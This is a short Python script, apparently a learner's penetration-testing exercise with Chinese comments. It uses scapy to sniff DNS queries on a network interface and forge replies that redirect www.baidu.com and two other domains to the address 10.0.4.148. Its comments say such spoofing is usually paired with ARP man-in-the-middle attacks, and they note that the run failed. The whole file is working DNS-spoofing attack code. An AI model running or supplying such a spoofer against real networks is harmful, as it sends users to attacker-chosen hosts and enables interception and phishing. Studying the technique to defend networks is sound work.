from scapy.all import *

from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR


# DNS协议是明文传输
# print(show_interfaces())  # get iface name
# 注意：DNS欺骗 + ARP中间人攻击 一般组合使用
# ref: https://www.bilibili.com/video/BV1EV411S7py?p=18
def dns_spoof(packet):
    # 要拦截的DNS
    testlist = ["www.baidu.com", "www.pentest.com", "www.abcd.com"]
    # 判断是否有DNS， 是否是请求     qr == 0 请求，qr == 1 应答
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        ip = packet.getlayer(IP)
        udp = packet.getlayer(UDP)
        dns = packet.getlayer(DNS)
        testdomain = dns.qd.qname.decode()[:-1]  # 取域名
        if testdomain in testlist:
            resp = IP(src=ip.dst, dst=ip.src)  # 源目交换
            resp /= UDP(sport=udp.dport, dport=udp.sport)
            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, rdata="10.0.4.148"))
            send(resp, verbose=False)
            print(f"DNS的应答已经被篡改，{dns.qd.qname}")


# 通过sniff捕获数据包
# sniff(filter="udp dst port 53", iface='以太网', prn=dns_spoof)
sniff(filter="udp dst port 53", iface='en0', prn=dns_spoof)  # failed
